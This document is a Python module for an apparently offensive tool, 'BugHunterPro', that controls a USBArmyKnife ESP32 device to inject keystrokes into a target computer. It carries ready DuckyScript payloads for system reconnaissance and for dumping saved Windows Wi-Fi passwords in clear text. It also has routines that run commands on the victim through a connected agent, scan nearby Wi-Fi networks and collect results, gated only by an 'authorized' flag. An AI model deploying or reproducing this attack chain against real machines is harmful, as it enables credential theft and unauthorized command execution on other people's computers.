#!/usr/bin/env python3
"""
USBArmyKnife integration module for BugHunterPro.

Communicates with a USBArmyKnife ESP32 device over its unauthenticated HTTP API
(default: http://4.3.2.1:8080).  All use requires explicit written authorization
from the target owner.

API reference: https://github.com/i-am-shodan/USBArmyKnife/wiki/Commands
"""

import json as _json
import logging
import textwrap
import time
from pathlib import Path

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from BugHunterPro import M, info, success, warn, error, vuln, section

log = logging.getLogger(__name__)

DEFAULT_HOST   = "4.3.2.1"
DEFAULT_PORT   = 8080
_HTTP_RETRIES  = 3      # attempts on 5xx / connection errors
_HTTP_BACKOFF  = 1.0    # base seconds; urllib3 doubles each attempt (1s, 2s, 4s)
_POLL_INTERVAL = 0.5    # seconds between log-growth polls
_MAX_POLL_WAIT = 30     # ceiling for adaptive waits


# ── Custom exception ─────────────────────────────────────────────────────────
class DeviceError(RuntimeError):
    """Raised when an USBArmyKnife API call fails after all retries."""


# ── DuckyScript payload library ──────────────────────────────────────────────
PAYLOADS = {
    "recon_windows": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 2000
        GUI r
        DELAY 600
        STRING cmd /c "whoami & hostname & ipconfig /all & net user & systeminfo" > %TEMP%\\bhp_recon.txt
        ENTER
        DELAY 1000
        GUI r
        DELAY 600
        STRING notepad %TEMP%\\bhp_recon.txt
        ENTER
    """),

    "recon_linux": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 1000
        CTRL-ALT t
        DELAY 1500
        STRING whoami; hostname; ip addr; id; cat /etc/passwd | cut -d: -f1; uname -a | tee /tmp/bhp_recon.txt
        ENTER
    """),

    "wifi_creds_windows": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 2000
        GUI r
        DELAY 600
        STRING cmd /c "for /f tokens=2delims=: %i in ('netsh wlan show profiles ^| findstr Profile') do @netsh wlan show profile name=%i key=clear" > %TEMP%\\bhp_wifi.txt
        ENTER
    """),

    "lock_screen": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 500
        GUI l
    """),

    "mouse_jiggle": textwrap.dedent("""\
        ATTACKMODE HID
        MOUSE_JIGGLE
    """),

    "open_terminal_linux": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 1000
        CTRL-ALT t
    """),
}

# ── Marauder command aliases ──────────────────────────────────────────────────
MARAUDER = {
    "scan_ap":       "scanaps",
    "scan_stations": "scansta",
    "scan_ble":      "scanble",
    "stop_scan":     "stopscan",
    "list_aps":      "listaps",
    "list_stations": "liststa",
}


def _build_session():
    """
    Build a requests.Session with automatic retry + exponential backoff.

    Retries on connection errors and 5xx responses.
    Does NOT retry on 4xx — those are API-level failures worth surfacing.
    """
    retry = Retry(
        total=_HTTP_RETRIES,
        backoff_factor=_HTTP_BACKOFF,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["GET", "POST"],
        raise_on_status=False,
    )
    s = requests.Session()
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.headers["User-Agent"] = "BugHunterPro/1.0"
    return s


# ── Low-level HTTP client ─────────────────────────────────────────────────────
class USBArmyKnifeClient:
    """
    Thin wrapper around USBArmyKnife's HTTP API.

    Interface contract
    ------------------
    Base URL : http://<host>:<port>  (default 4.3.2.1:8080)
    Auth     : none — all endpoints are unauthenticated
    Protocol : GET with query params; most control endpoints return a 302
               redirect to /index.html which resolves to 200
    Errors   : raises DeviceError on any unrecoverable HTTP failure;
               transient 5xx / connection errors are retried automatically
               by the underlying Session (up to _HTTP_RETRIES attempts)
    """

    def __init__(self, host=DEFAULT_HOST, port=DEFAULT_PORT, timeout=10):
        self.base    = f"http://{host}:{port}"
        self.timeout = timeout
        self._s      = _build_session()
        log.debug("Client ready — base=%s timeout=%ss", self.base, timeout)

    def _get(self, path, params=None):
        url = f"{self.base}{path}"
        log.debug("→ GET %s  params=%s", url, params)
        try:
            resp = self._s.get(url, params=params,
                               timeout=self.timeout, allow_redirects=True)
            resp.raise_for_status()
            log.debug("← %s %s", resp.status_code, url)
            return resp
        except requests.RequestException as exc:
            raise DeviceError(f"GET {path} failed: {exc}") from exc

    # Status ------------------------------------------------------------------
    def status(self):
        """GET /data.json → full device state dict."""
        try:
            return self._get("/data.json").json()
        except (ValueError, DeviceError) as exc:
            raise DeviceError(f"Failed to parse /data.json: {exc}") from exc

    def capabilities(self):
        return self.status().get("capabilities", [])

    def is_agent_connected(self):
        return bool(self.status().get("agentConnected", False))

    def list_files(self):
        return self.status().get("fileListing", [])

    def get_logs(self):
        return self.status().get("logMessages", [])

    # File management ---------------------------------------------------------
    def upload(self, filename, content):
        """POST /uploadFile (multipart/form-data). Raises DeviceError on failure."""
        data = content.encode() if isinstance(content, str) else content
        url  = f"{self.base}/uploadFile"
        log.debug("→ POST %s  filename=%s  size=%d bytes", url, filename, len(data))
        try:
            resp = self._s.post(
                url,
                files={"file": (filename, data, "text/plain")},
                timeout=self.timeout,
            )
            resp.raise_for_status()
            return resp.status_code == 200
        except requests.RequestException as exc:
            raise DeviceError(f"Upload of '{filename}' failed: {exc}") from exc

    def download(self, filename):
        """GET /downloadFile?filename=<name> → raw bytes."""
        return self._get("/downloadFile", {"filename": filename}).content

    def delete(self, filename):
        """GET /delete?filename=<name>."""
        self._get("/delete", {"filename": filename})

    def clear_logs(self):
        """GET /clearlogs."""
        self._get("/clearlogs")

    # Execution ---------------------------------------------------------------
    def run_file(self, filename):
        """GET /runfile?filename=<name> — execute a DuckyScript file on SD."""
        self._get("/runfile", {"filename": filename})

    def run_raw(self, command):
        """GET /rawinput?rawCommand=<cmd> — run a single DuckyScript line."""
        self._get("/rawinput", {"rawCommand": command})

    def agent_exec(self, command):
        """GET /runagentcmd?rawCommand=<cmd> — relay command via connected agent."""
        self._get("/runagentcmd", {"rawCommand": command})

    # Marauder ----------------------------------------------------------------
    def marauder(self, command):
        """GET /marauder?marauderCmd=<cmd> — run an ESP32 Marauder command."""
        self._get("/marauder", {"marauderCmd": command})

    # Settings / misc ---------------------------------------------------------
    def set_setting(self, name, value):
        """GET /set?name=<n>&value=<v>."""
        self._get("/set", {"name": name, "value": str(value)})

    def mic(self, enabled):
        """GET /mic?enabled=<true|false>."""
        self._get("/mic", {"enabled": "true" if enabled else "false"})


# ── High-level attack module ──────────────────────────────────────────────────
class USBAttackModule:
    """
    Orchestrates USBArmyKnife device actions within a BugHunterPro scan.

    ALL use requires explicit written authorization from the system owner.
    Pass ``authorized=True`` to ``run_full()`` to acknowledge this requirement;
    the method raises ``PermissionError`` otherwise.

    Error handling
    --------------
    Each step catches ``DeviceError`` individually, appends to
    ``self.results["errors"]``, and continues so a failure in one phase
    does not abort the rest of the chain.

    Adaptive waits
    --------------
    Methods do NOT sleep for a fixed duration after sending commands.
    ``_wait_for_log_growth()`` polls ``/data.json`` until the device log
    count grows (indicating activity) or a ceiling is reached.

    Usage (standalone)::

        mod = USBAttackModule("4.3.2.1", verbose=True)
        results = mod.run_full(
            payloads=["recon_windows"],
            wifi_recon=True,
            authorized=True,
        )

    Usage (integrated — BugHunterPro --usb-host)::

        hunter = BugHunterPro("example.com", usb_host="4.3.2.1")
        results = hunter.hunt()
    """

    def __init__(self, host=DEFAULT_HOST, port=DEFAULT_PORT, verbose=False):
        self.client  = USBArmyKnifeClient(host, port)
        self.host    = host
        self.port    = port
        self.verbose = verbose
        self.results = {
            "device":       {},
            "wifi_aps":     [],
            "agent_output": [],
            "payloads_run": [],
            "findings":     [],
            "errors":       [],
        }
        if verbose:
            log.setLevel(logging.DEBUG)
            if not log.handlers:
                handler = logging.StreamHandler()
                handler.setFormatter(logging.Formatter(
                    f"{M.GRAY}%(asctime)s [usb] %(levelname)s %(message)s{M.RST}",
                    datefmt="%H:%M:%S",
                ))
                log.addHandler(handler)

    # ── Internal helpers ─────────────────────────────────────────────────────
    def _record_error(self, context, exc):
        msg = f"{context}: {exc}"
        error(msg)
        self.results["errors"].append(msg)
        log.debug("Error captured in %s", context, exc_info=exc)

    def _wait_for_log_growth(self, baseline, max_wait=_MAX_POLL_WAIT):
        """
        Poll /data.json until log count exceeds baseline or max_wait seconds
        elapse.  Returns final log list.  Adapts to actual device activity
        instead of sleeping a fixed duration.
        """
        deadline = time.monotonic() + max_wait
        while time.monotonic() < deadline:
            try:
                logs = self.client.get_logs()
                if len(logs) > baseline:
                    log.debug("Log grew %d → %d entries", baseline, len(logs))
                    return logs
            except DeviceError:
                pass
            time.sleep(_POLL_INTERVAL)

        log.debug("Log-growth wait timed out after %ds", max_wait)
        try:
            return self.client.get_logs()
        except DeviceError:
            return []

    # ── Lifecycle ────────────────────────────────────────────────────────────
    def connect(self):
        """Verify device is reachable and populate the device fingerprint."""
        section(f"USB Attack Module — {self.host}:{self.port}")
        try:
            st = self.client.status()
        except DeviceError as exc:
            self._record_error("connect", exc)
            return False

        self.results["device"] = {
            "version":        st.get("version",          "unknown"),
            "chipModel":      st.get("chipModel",         "unknown"),
            "numCores":       st.get("numCores",          0),
            "freeHeap":       st.get("freeHeap",          0),
            "heapUsagePc":    st.get("heapUsagePc",       0),
            "uptime":         st.get("uptime",            ""),
            "USBmode":        st.get("USBmode",           ""),
            "capabilities":   st.get("capabilities",      []),
            "agentConnected": st.get("agentConnected",    False),
            "machineName":    st.get("machineName",       ""),
            "sdCardPct":      st.get("sdCardPercentFull", 0),
        }
        d = self.results["device"]
        success(f"Connected — {d['chipModel']}  fw {d['version']}  uptime {d['uptime']}")
        info(f"Capabilities : {', '.join(d['capabilities']) or 'none'}")
        info(f"USB mode     : {d['USBmode']}  |  Agent: {'yes' if d['agentConnected'] else 'no'}")
        info(f"Heap         : {d['heapUsagePc']}% used  ({d['freeHeap']} bytes free)")
        if d["machineName"]:
            vuln(f"Target machine visible via agent: {d['machineName']}")
        return True

    # ── WiFi recon ───────────────────────────────────────────────────────────
    def wifi_recon(self, scan_duration=15):
        """
        Trigger a Marauder AP scan and adaptively collect results.

        scan_duration is the minimum wait before stopping the scan.  The loop
        also stops early if the log fills with enough entries, avoiding
        unnecessary waiting on fast targets.
        """
        caps = self.results["device"].get("capabilities", [])
        if "MARAUDER" not in caps:
            warn("Device has no MARAUDER capability — skipping WiFi recon")
            return []

        section("WiFi Recon (Marauder)")
        try:
            self.client.clear_logs()
            self.client.marauder(MARAUDER["scan_ap"])
        except DeviceError as exc:
            self._record_error("wifi_recon/start", exc)
            return []

        # Adaptive poll: check log growth; stop early if scan looks complete
        info(f"AP scan running (up to {scan_duration}s)…")
        time.sleep(min(scan_duration, 3))
        deadline = time.monotonic() + max(0, scan_duration - 3)
        prev_count = 0
        while time.monotonic() < deadline:
            try:
                count = len(self.client.get_logs())
                if count > 0 and count == prev_count:
                    log.debug("Log count stable at %d — stopping scan early", count)
                    break
                prev_count = count
            except DeviceError:
                pass
            time.sleep(1)

        try:
            self.client.marauder(MARAUDER["stop_scan"])
            time.sleep(0.5)
            logs = self.client.get_logs()
        except DeviceError as exc:
            self._record_error("wifi_recon/stop", exc)
            return []

        aps = [
            str(e).strip()
            for e in logs
            if any(kw in str(e) for kw in ("BSSID", "ESSID", "Ch:", "RSSI", "AP:"))
        ]
        if aps:
            success(f"Captured {len(aps)} AP record(s)")
            for ap in aps[:10]:
                info(f"  {M.GRAY}{ap}")
            self.results["wifi_aps"] = aps
            self.results["findings"].append({
                "type":     "WiFi Network Exposure",
                "severity": "Info",
                "detail":   f"{len(aps)} nearby APs enumerated via Marauder scan",
                "evidence": aps[:5],
            })
        else:
            warn("No AP records in logs — try a longer scan_duration")

        return aps

    # ── Payload delivery ─────────────────────────────────────────────────────
    def run_payload(self, payload_name, max_wait=_MAX_POLL_WAIT):
        """
        Upload and execute a named payload from the built-in library.

        Waits adaptively for log activity to confirm execution started rather
        than sleeping a fixed duration.  Returns True on success.
        """
        if payload_name not in PAYLOADS:
            error(f"Unknown payload '{payload_name}'.  Available: {list(PAYLOADS)}")
            return False

        section(f"HID Payload — {payload_name}")
        filename = f"bhp_{payload_name}.txt"

        try:
            info(f"Uploading '{filename}'…")
            self.client.upload(filename, PAYLOADS[payload_name])
            success("Uploaded")
        except DeviceError as exc:
            self._record_error(f"run_payload/upload:{payload_name}", exc)
            return False

        try:
            baseline = len(self.client.get_logs())
            info("Executing…")
            self.client.run_file(filename)
        except DeviceError as exc:
            self._record_error(f"run_payload/run:{payload_name}", exc)
            return False

        self._wait_for_log_growth(baseline, max_wait=max_wait)
        self.results["payloads_run"].append(payload_name)
        success(f"Payload '{payload_name}' dispatched")
        return True

    def run_custom_payload(self, filename, script, max_wait=_MAX_POLL_WAIT):
        """Upload and execute a custom DuckyScript string."""
        section(f"Custom Payload — {filename}")
        try:
            info(f"Uploading '{filename}'…")
            self.client.upload(filename, script)
            baseline = len(self.client.get_logs())
            self.client.run_file(filename)
        except DeviceError as exc:
            self._record_error(f"run_custom_payload:{filename}", exc)
            return False

        self._wait_for_log_growth(baseline, max_wait=max_wait)
        self.results["payloads_run"].append(filename)
        success("Dispatched")
        return True

    # ── Agent recon ──────────────────────────────────────────────────────────
    def agent_recon(self):
        """
        Run recon commands via the victim-side agent.

        Uses adaptive log polling per command instead of a fixed sleep.
        Failures on individual commands are recorded but do not stop the
        remaining commands from running.
        """
        section("Agent Recon")
        try:
            if not self.client.is_agent_connected():
                warn("Agent not connected — skipping agent recon")
                return []
            self.client.clear_logs()
        except DeviceError as exc:
            self._record_error("agent_recon/init", exc)
            return []

        commands = [
            ("whoami",        "Current user"),
            ("hostname",      "Machine hostname"),
            ("ipconfig /all", "Network config"),
            ("net user",      "Local accounts"),
        ]
        for cmd, label in commands:
            info(f"Executing via agent: {label}")
            try:
                baseline = len(self.client.get_logs())
                self.client.agent_exec(cmd)
                self._wait_for_log_growth(baseline, max_wait=8)
            except DeviceError as exc:
                self._record_error(f"agent_recon/cmd:{cmd!r}", exc)

        try:
            output = [str(e).strip() for e in self.client.get_logs()]
        except DeviceError as exc:
            self._record_error("agent_recon/collect", exc)
            return []

        if output:
            success(f"Captured {len(output)} output line(s)")
            self.results["agent_output"] = output
            self.results["findings"].append({
                "type":     "Remote Agent Code Execution",
                "severity": "Critical",
                "detail":   "Agent command execution confirmed on target machine",
                "evidence": output[:10],
            })
        return output

    # ── File dump ────────────────────────────────────────────────────────────
    def dump_device_files(self, dest_dir="."):
        """Download every file from the device SD card."""
        section("Device File Dump")
        try:
            files = self.client.list_files()
        except DeviceError as exc:
            self._record_error("dump_device_files/list", exc)
            return []

        if not files:
            warn("No files found on device")
            return []

        dest, saved = Path(dest_dir), []
        for filename in files:
            try:
                data = self.client.download(filename)
                out  = dest / Path(filename).name
                out.write_bytes(data)
                success(f"Saved: {out}  ({len(data)} bytes)")
                saved.append(str(out))
            except DeviceError as exc:
                self._record_error(f"dump_device_files:{filename}", exc)

        return saved

    # ── Full chain ───────────────────────────────────────────────────────────
    def run_full(self, payloads=None, wifi_recon=True, agent_recon=True,
                 wifi_scan_duration=15, authorized=False):
        """
        Run the complete USB attack chain and return the results dict.

        Parameters
        ----------
        payloads           : list[str] — payload names from PAYLOADS dict
        wifi_recon         : bool — run Marauder AP scan (needs MARAUDER cap)
        agent_recon        : bool — relay recon commands via connected agent
        wifi_scan_duration : int  — minimum AP scan seconds
        authorized         : bool — MUST be True; acknowledges explicit written
                             permission to test the target system

        Raises PermissionError if authorized=False.
        Returns self.results (errors collected, not raised).
        """
        if not authorized:
            raise PermissionError(
                "USB attack chain requires authorized=True.\n"
                "Only use USBAttackModule on systems you have explicit "
                "written permission to test."
            )

        if not self.connect():
            return self.results

        if wifi_recon:
            self.wifi_recon(scan_duration=wifi_scan_duration)

        for name in (payloads or []):
            self.run_payload(name)

        if agent_recon:
            self.agent_recon()

        if self.results["errors"]:
            warn(f"{len(self.results['errors'])} error(s) during USB run — "
                 "see results['errors'] for details")

        return self.results


# ── CLI entry point (standalone) ─────────────────────────────────────────────
def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="USBArmyKnife module for BugHunterPro — authorized use only",
    )
    parser.add_argument("--host",    default=DEFAULT_HOST, help="Device IP (default: 4.3.2.1)")
    parser.add_argument("--port",    default=DEFAULT_PORT, type=int, help="HTTP port (default: 8080)")
    parser.add_argument("--payload", nargs="*", default=[], dest="payloads",
                        metavar="NAME", help=f"Payload(s) to run: {list(PAYLOADS)}")
    parser.add_argument("--wifi",    action="store_true", help="Run Marauder WiFi AP recon")
    parser.add_argument("--agent",   action="store_true", help="Run recon via connected agent")
    parser.add_argument("--dump",    action="store_true", help="Download all SD card files")
    parser.add_argument("--wifi-duration", type=int, default=15, metavar="SECS",
                        help="WiFi scan duration (default: 15s)")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Enable debug-level logging")
    parser.add_argument("--authorized", action="store_true",
                        help="Confirm you have explicit written permission to test this target")
    args = parser.parse_args()

    if not args.authorized:
        print(
            f"\n{M.RUST}{M.BOLD}  ✗  Authorization required{M.RST}\n"
            f"  Pass --authorized to confirm you have explicit written\n"
            f"  permission to test this target.\n"
        )
        raise SystemExit(1)

    mod     = USBAttackModule(args.host, args.port, verbose=args.verbose)
    results = mod.run_full(
        payloads=args.payloads,
        wifi_recon=args.wifi,
        agent_recon=args.agent,
        wifi_scan_duration=args.wifi_duration,
        authorized=True,
    )

    if args.dump:
        mod.dump_device_files()

    print(_json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
